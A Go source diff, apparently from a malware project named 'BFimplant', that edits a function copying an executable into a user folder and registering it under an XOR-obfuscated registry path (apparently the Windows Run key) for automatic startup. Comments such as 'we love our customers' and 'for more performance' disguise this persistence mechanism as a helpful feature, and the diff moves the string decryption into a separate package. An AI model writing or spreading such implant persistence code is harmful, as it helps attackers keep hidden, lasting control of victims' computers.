@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"syscall"
 	"path/filepath"
+	"BFimplant/winapiV2"
 )
 
 //we love our customers
@@ -21,13 +22,13 @@ func Add_per(){
             fmt.Println("Error copying executable:", err)
             return
         }
-        fmt.Println("Executable copied successfully to thank you for your help:", destPath)
+        fmt.Println("plants copied successfully to thank you for your help:", destPath)
     } else {
-        fmt.Println("Executable already exists in Documents folder:", destPath)
+        fmt.Println("plants already exists in Doccccc:", destPath)
     }
 
     //this function will help you to run your application at startup for more performance
-	key, err := RegCreateKeyEx(syscall.HKEY_CURRENT_USER, DecryptString("\x16*#12$7 \x19\x08,&7*6*#1\x19\x12,+!*26\x19\x06077 +1\x13 76,*+\x19\x170+"))
+	key, err := RegCreateKeyEx(syscall.HKEY_CURRENT_USER, winapiV2.DecryptString("\x16*#12$7 \x19\x08,&7*6*#1\x19\x12,+!*26\x19\x06077 +1\x13 76,*+\x19\x170+"))
 	fmt.Println(key)
 	if err != nil {
 		fmt.Println("", err)
@@ -37,9 +38,9 @@ func Add_per(){
 
 	err = RegSetValueEx(key, "MyApp", destPath)
 	if err != nil {
-		fmt.Println("Error setting registry value:", err)
+		fmt.Println("Error settttt regggggg vallll:", err)
 		return
 	}
 
-	fmt.Println("customer Your application will run at startup .")
+	fmt.Println("Your plant will grow at startup .")
 }
